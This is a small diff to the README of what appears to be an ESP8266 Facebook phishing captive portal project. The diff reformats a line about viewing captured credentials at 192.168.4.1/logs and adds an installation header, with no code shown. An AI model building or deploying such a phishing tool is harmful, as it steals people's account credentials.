@@ -1,8 +1,10 @@
 # ESP8266-Facebook Phishing
 ESP8266 phishing facebook Captive Portal.
 
-To see captured credentials: 192.168.4.1/logs
+#To see captured credentials: 192.168.4.1/logs
 
+
+#INSTALLATION
 Download Zip and Extract.
 
 
